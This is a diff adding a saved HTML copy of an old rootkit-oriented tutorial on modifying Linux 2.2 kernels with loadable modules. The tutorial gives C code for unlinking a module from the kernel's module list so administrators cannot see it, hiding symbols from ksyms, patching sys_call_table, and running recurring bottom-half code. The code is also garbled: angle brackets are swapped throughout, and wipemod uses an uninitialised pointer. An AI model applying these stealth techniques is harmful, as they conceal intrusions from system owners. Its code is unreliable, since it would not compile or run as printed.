@@ -1,0 +1,290 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0057)http://doc.bughunter.net/rootkit-backdoor/kernel-mod.html -->
+<HTML xmlns="http://www.w3.org/1999/xhtml"><HEAD><TITLE>Modify the Kernel using modules</TITLE>
+<META http-equiv=Content-type content="text/html; charset=iso-8859-1">
+<META content="index, follow, all" name=robots><LINK 
+href="Modify the Kernel using modules_fichiers/style.css" type=text/css 
+rel=stylesheet>
+<META content="MSHTML 6.00.2900.2912" name=GENERATOR></HEAD>
+<BODY>
+<DIV class=main>
+<H1>Kernel Modification Using LKMs</H1>
+<P>Written by : <A href="mailto:dalai@insomnia.org">dalai</A><BR>First published 
+on : <A href="http://www.trauma-inc.com/" rel=nofollow>Trauma Inc</A></P>
+<H2><A name=intro>Introduction</A></H2>
+<P>This paper explores the mysterious virtue of kernel modification, with 
+particular regard toward LKMs and their use in the subject. Kernel hacking is no 
+easy task, but well worth the trouble of learning it. If you're not yet involved 
+in it, maybe this will catch your interest. If you are, maybe this will teach 
+you a few things.</P>
+<P>I'm assuming that the reader is an experienced Unix user, is fairly familiar 
+with kernel principles and semantics, and is a C programmer. That's you, and 
+you've used LKMs in routine administration tasks, but maybe you're not sure how 
+they actually work? In that case, I'll begin with a crash course on the 
+subject.</P>
+<P>An LKM, or Loadable Kernel Module, is a system used by Linux as well as some 
+other modern operating systems to allow the linking of object code into a 
+running kernel without interrupting any system traffic. Most basically, an 
+object is compiled to a relocatable object (.o) file, loaded using 'insmod' 
+under Linux, and removed using 'rmmod'. Linux also supports demand loading of 
+modules, using 'kerneld'(now kmod). Don't forget the man pages.</P>
+<P>Once 'insmod' is called, the module is linked into the running system kernel 
+and the function init_module() is called. All modules must contain this 
+function, as well as cleanup_module() which is called at unloading. The purpose 
+of init_module() is to register the functions contained within the module to 
+handle system events, such as to be device drivers or interrupt handlers.</P>
+<P>The actions performed by insmod are similar to that of 'ld', at least as far 
+as linkage goes. You are free to write to your hearts content, however you may 
+not use functions contained in libraries, such as libc. It seems like many 
+newcomers to kernel coding don't realize this. It sounds crippling, but you can 
+none the less produce some very interesting and useful modules, and without 
+overhead of static libraries.</P>
+<P>I've narrowed this down to two main parts; stealthing a module(to avoid 
+detection), and utilizing basic system resources from within a module. If you're 
+curious about anything not discussed here feel free to email me at the address 
+above.</P>
+<H2><A name=hide>Stealth</A></H2>
+<P>To effectively hide a module we should first determine where it is likely to 
+be seen. We obviously should remove any traces of our modification from 
+/proc/modules, and thereby lsmod. In addition, we should ensure that our 
+functions do not appear in the kernel symbol table, /proc/ksyms. To be extra 
+careful, we should hide the disk image after we've loaded the module into 
+memory.</P>
+<P>Removing a module from the system list of modules was first introduced to me 
+in Phrack 52, in an article by Plaguez entitled 'Weakening the Linux Kernel'. 
+This is an excellent article for beginners and I suggest you read it. Plaguez 
+technique requires little more than changing a few values in memory, which can 
+be referenced with &gt;linux/module.h&lt;.</P>
+<P>Unfortunately Plaguez's technique does not work on the newer 2.2 kernels. 
+Earlier kernel versions contained this line in kernel/module.c which allowed his 
+technique:</P><PRE>	if(*q == '\0' &amp;&amp; mp-&lt;size == 0 &amp;&amp; mp-&lt;ref == NULL)
+		continue; /* don't list modules for kernel syms */
+
+        This is not present in 2.2.
+</PRE>
+<P>To remedy this I have written what you will find below. It simply takes the 
+specified module out of the module list, leaving the actual module in memory. 
+The target module must have already been loaded. This will unload itself after 
+running, so don't bother doing it.</P><PRE>/*
+ * wipemod.c
+ * dalai(dalai@insomnia.org)
+ *
+ * usage: 'insmod wipemod name=target.o'
+ *
+ * Notice: The target module must already be loaded,
+ * and wipemod will unload itself.  Also, because
+ * it unloads itself, wipemod cannot restore a module
+ * into the list after it has been taken out.
+ *
+ * This is built for Linux 2.2.
+ *
+ *	Ignore annoying secondary error messages.
+*/
+
+#include &gt;linux/kernel.h&lt;
+#include &gt;linux/module.h&lt;
+#include &gt;linux/string.h&lt;
+
+char *name;
+MODULE_PARM(name, "s");
+
+int
+init_module()
+{
+        struct module *lmod;
+
+	if(name == NULL){
+	  printk("&gt;1&lt;usage: 'insmod wipemod name=target.o'\n");
+ 	  return 1;
+	}
+
+	while(1){
+                if(!lmod-&lt;next){
+	  	  printk("&gt;1&lt;Failure.  Perhaps the target module isn't loaded?\n");
+		  return 1;
+		}
+
+		if(!strcmp((char *) lmod-&lt;next-&lt;name, name)){
+		  if(lmod-&lt;next-&lt;ndeps != 0)	/* level ndeps */
+                    lmod-&lt;next-&lt;ndeps = 0;
+
+                  lmod-&lt;next = lmod-&lt;next-&lt;next;
+
+		  printk("&gt;1&lt;Success.\n");
+		  return 1; /* return 1 so it will unload. */
+		}
+
+		lmod = lmod-&lt;next;
+	}
+}
+
+void
+cleanup_module()
+{
+        /* This will never be called. */
+}
+</PRE>
+<P>This has another useful function; it can be used to remove a broken module 
+from the listings. This is very handy when you do something wrong while creating 
+a module and it refuses to unload, which happens more often than you may think. 
+Running this for this purpose is not as safe as rebooting, as the module is 
+technically still in memory, but it's much faster.</P>
+<H2><A name=symbols>Symtabs</A></H2>
+<P>Keeping components of your module from being listed in ksyms used to be 
+handled by 'register_symtabs', however that has changed with newer kernel 
+versions. There are new ways of doing this now, but why would we want to in the 
+first place? First of all it will keep the curious system administrator from 
+seeing something such as 'hax0r_passwordz()' and its address in the kernel 
+symbol table. Second, it will keep any other module from referencing you, 
+although that occurrence is improbable.</P>
+<P>Selectively allowing some parts of your code to show up as ksyms can be done 
+by simply creating the functions you wish to be hidden as 'static'. For 
+instance, 'static int return_vals()' would not show up, whereas 'int 
+return_vals()' would.</P>
+<P>Alternatively you can slip 'EXPORT_NO_SYMBOLS;' into your module somewhere. 
+This is defined in &gt;linux/module.h&lt; as this:</P><PRE>	#define EXPORT_NO_SYMBOLS  __asm__(".section __ksymtab\n.previous")
+</PRE>
+<P>Installing your module with 'insmod -x' would also be effective, but that is 
+boring ;).</P>
+<H2><A name=kernel>Using Kernel Resources</A></H2>
+<P>After it has been loaded, your code of course becomes part of the kernel, and 
+can do anything. In the right hands this commodity is (root * 10). As examples 
+of this I'll show you some interesting things that a module can do, including 
+how to add your own system calls at runtime.</P>
+<P>The list of exported kernel symbols(ones you can readily utilize) is located 
+in /proc/ksyms. A more pretty version of this list can be viewed with the 
+'ksyms' command. Note that by default 'ksyms' does not display symbols from "the 
+kernel proper". You can view all symbols with 'ksyms -a'.</P>
+<P>Even though you can't directly link libraries into your module, you can do 
+anything from kernel code that you would be able to do with any library, 
+including libc. After all, libraries eventually rely on kernel functions to 
+operate. As a simple example:</P><PRE>	libc: var = getuid();
+
+	kernel: var = current-&lt;uid;
+</PRE>
+<P>It may go understood without mention that in order to use the second example 
+from above, &gt;linux/sched.h&lt; needs to be included.</P>
+<P>You can see how some inherent system calls handle the absence of convenient 
+library functions in the kernel source, 'kernel/exit.c' for 
+example(sys_exit).</P>
+<H2><A name=syscalls>System calls</A></H2>
+<P>Much more interesting is the possibility of adding system calls to a running 
+kernel. But why would you want to do this? It's practical use may not be as 
+defined as it's educational purpose, but it is not non-existent. An example of 
+possible use for this would be to provide temporary portability for compiling 
+and running certain programs on an other than native platform. Dirty, but not 
+without utility.</P>
+<P>Viewing the assembly source in arch/i386/kernel/entry.S, we see that several 
+things happen when the switch is made from user mode with the system call. 
+Initially registers are saved, a comparison is made against the value of 
+NR_syscalls to make sure that the requested call is within bounds, and control 
+is passed to the system call. The actual call is indexed by numbers contained in 
+&gt;asm/unistd.h&lt;, one for each system call(__NR_syscall), which reside in 
+'void *sys_call_table[]'.</P>
+<P>Knowing the above we can implement our own system call as follows:</P><PRE>#include &gt;linux/kernel.h&lt;
+#include &gt;linux/module.h&lt;
+#include &gt;linux/sys.h&lt;
+#include &gt;stdio.h&lt;
+
+extern void *sys_call_table[];
+
+asmlinkage static int sys_my_func();
+
+void *old_val;
+
+int
+init_module()
+{
+	old_val = (void *) sys_call_table[250];
+
+	sys_call_table[250] = (void *) sys_my_func;
+
+	return 0;
+}
+
+asmlinkage static int
+sys_my_func()
+{
+	printk("I am a working system call.\n");
+	return 0;
+}
+
+void
+cleanup_module()
+{
+	sys_call_table[250] = old_val;
+}
+</PRE>
+<P>And we can call it as such:</P><PRE>		__asm__("movl   $250, %eax
+			 int    $0x80");
+</PRE>
+<P>Or with _syscall0().</P>
+<H2><A name=handler>Bottom-half handlers</A></H2>
+<P>Bottom-half handlers are part of the interrupt mechanism of Linux. The 
+purpose behind them is to speed up system operation. When an interrupt occurs 
+the main interrupt handler will typically do a small amount of work, and then 
+return control to the OS. At a later time the interrupts bottom-half will be 
+executed, this is typically the bulk of the interrupt code. Doing things this 
+way allows the system to spend a minimal amount of time within a single 
+interrupt.</P>
+<P>It's very possible to register our own bottom-half handlers, even without 
+providing support for any actual interrupts. Using functions already built into 
+the kernel, we can register a function as a bottom-half, mark it to be run, and 
+thereby have are code executed as any real bottom-half.</P>
+<P>But why would we want to do this? Surely by now you know to trust me when I 
+say there's a purpose behind some weird manipulation of the kernel that I 
+present. In this case, we do it so that a desired bit of code is executed on a 
+relatively constant basis, so that we may repeatedly perform a small task. For 
+example, you may want to continuously check /var/adm/utmp and report when a user 
+logs in/out.</P>
+<P>Bottom-halves are checked for execution upon every return from a system call, 
+as you can see in arch/i386/kernel/entry.S. Take a look at kernel/softirq.c as 
+well.</P><PRE>/*
+ *	init_bh initializes a function as a handler, mark_bh marks
+ *	it to be executed upon the next scout for bottom-halves,
+ *	disable_bh uninitializes it.  Each time a bottom-half is run,
+ *	it is removed from the queue, therefore we call mark_bh after
+ *	each run of the registered function.
+ */
+
+#include &gt;linux/kernel.h&lt;
+#include &gt;linux/module.h&lt;
+#include &gt;linux/sched.h&lt;
+#include &gt;linux/interrupt.h&lt;
+
+#define EMPTY_BH	30
+
+static void our_half(void *);
+
+int
+init_module()
+{
+	init_bh(EMPTY_BH, (void *) our_half);
+	mark_bh(EMPTY_BH);
+	
+	return 0;
+}
+
+static void
+our_half(void *null)
+{
+	/* insert code here... */
+
+	mark_bh(EMPTY_BH);	/* mark to run again */
+}
+
+void
+cleanup_module()
+{
+	disable_bh(EMPTY_BH);
+}
+</PRE></DIV>
+<SCRIPT src="Modify the Kernel using modules_fichiers/urchin.js" 
+type=text/javascript>
+</SCRIPT>
+
+<SCRIPT type=text/javascript>
+_uacct = "UA-116970-3";
+urchinTracker();
+</SCRIPT>
+</BODY></HTML>
